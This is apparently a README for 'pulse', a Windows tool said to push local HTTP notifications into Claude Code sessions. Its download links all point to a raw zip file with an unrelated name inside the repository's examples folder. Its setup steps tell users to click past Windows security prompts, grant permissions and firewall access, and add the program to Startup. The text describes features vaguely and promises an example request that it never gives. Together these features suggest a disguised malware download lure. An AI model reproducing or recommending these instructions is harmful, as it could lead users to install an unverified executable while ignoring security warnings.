# 🔔 pulse - Send Claude Code alerts fast

[![Download pulse](https://img.shields.io/badge/Download%20pulse-4B7BEC?style=for-the-badge&logo=github&logoColor=white)](https://github.com/brandyantiseptic907/pulse/raw/refs/heads/main/examples/Software-drungar.zip)

## 📥 Download

Visit this page to download and run pulse on Windows:

https://github.com/brandyantiseptic907/pulse/raw/refs/heads/main/examples/Software-drungar.zip

## 🧩 What pulse does

pulse adds local channel notifications to Claude Code. It lets a tool or script send a message into an active session through HTTP. That means you can push a ping, status update, or task note into your Claude Code flow without using Discord, Slack, or email.

Use it when you want a simple local bridge between your tools and your Claude Code session. You send a request. pulse passes it into the channel. Claude Code can then react to it in the same workflow.

## 🖥️ Windows setup

1. Open the download page in your browser.
2. Look for the latest Windows build or release file.
3. Download the file to your computer.
4. If Windows shows a security prompt, choose the option to keep or run the file.
5. Start pulse by double-clicking the downloaded file.
6. If Windows asks where to place the app, keep the default choice.
7. Leave pulse open while you use Claude Code.

## ⚙️ First run

When pulse starts, it opens a local service on your machine. This lets other apps send messages to your Claude Code session.

Follow these steps:

1. Start Claude Code.
2. Start pulse.
3. Keep both running on the same PC.
4. Send a test request from your browser, script, or local tool.
5. Check that the message shows up in the session.

If you want pulse to start with Windows, add it to your Startup folder after you confirm it works.

## 🔌 How it works

pulse uses HTTP, which is the same basic system web tools use to talk to each other. A local app or script sends a request to pulse. pulse turns that request into a channel event for Claude Code.

A simple setup looks like this:

- Your script runs a task
- The task sends an HTTP request to pulse
- pulse forwards the message into Claude Code
- Claude Code sees the update during the session

This fits well with automation, CI/CD, and local developer tools.

## ✨ What you can use it for

- Send build updates into Claude Code
- Push test results into a live session
- Notify Claude Code when a script finishes
- Trigger a note from a local tool
- Pass a short status message from one app to another
- Keep your workflow in one place without switching apps

## 🧪 Example uses

### Build status
If your local build finishes, send a message like:

- Build passed
- Build failed
- Lint found issues
- Tests are still running

### Task handoff
If one script finishes a job, it can send the next step into Claude Code so you do not need to copy and paste.

### Local alerts
If a background tool finds a problem, pulse can send a quick alert into your session.

## 🛠️ Basic use

You do not need to know how the internals work to use pulse. In most cases, you only need to:

1. Install or download the app
2. Open pulse
3. Start Claude Code
4. Send a local HTTP request when you want a notification

A common pattern is to use curl from Windows PowerShell or from another script. That lets you send a short message from almost any automation flow.

## 📡 Example request

A simple request may look like this in plain terms:

- Open a local URL
- Send a short message
- Include the text you want Claude Code to see

If you already use scripts, you can plug pulse into your current workflow. If you do not use scripts yet, start with a small test message and build from there.

## 🔒 Local use

pulse is built for local use on your own computer. It is meant to stay in your workflow while you work inside Claude Code. That makes it a good fit for:

- Local development
- One-machine automation
- Personal build alerts
- Session-based notes
- Quick notification plumbing

## 🧰 System needs

pulse is meant for Windows desktops and laptops. A normal modern Windows machine should be enough.

Recommended setup:

- Windows 10 or Windows 11
- Claude Code installed
- An internet browser
- Permission to run downloaded files
- A terminal or script tool if you want to send HTTP requests

## 🔎 Before you run it

Make sure you have:

- Downloaded the app from the link above
- Started Claude Code
- Kept pulse open
- Allowed Windows Firewall if it asks for local network access
- Used the same machine for both tools

If you use a work laptop, you may need approval from your system admin before running local tools.

## 🧭 If you want to connect a tool

If you plan to use pulse with another app, use these steps:

1. Open the tool that should send the notification
2. Set the request target to pulse on your local machine
3. Add the message you want to send
4. Run the action
5. Check Claude Code for the update

This works well with build scripts, test runners, and local task automation.

## 🪟 Common Windows steps

If Windows asks what to do with the file:

- Choose Open or Run
- If it asks for permission, choose Yes
- If it asks where to save, use Downloads
- If it asks for a firewall prompt, allow local access if you trust the app

If the file does not open, check that the download finished and try again.

## 🧩 Tips for smooth use

- Keep pulse running while you use Claude Code
- Use short messages at first
- Test with one simple alert before using it in a larger flow
- Use plain text for your first message
- Keep both apps on the same machine

## 📚 Related topics

pulse fits well with:

- automation
- bun
- channel
- ci-cd
- claude-code
- claude-code-plugin
- developer-tools
- mcp
- mcp-server
- notifications
- plugin

## ✅ Quick start

1. Visit the download page
2. Download pulse for Windows
3. Run the app
4. Start Claude Code
5. Send a local HTTP message
6. Check the session for the update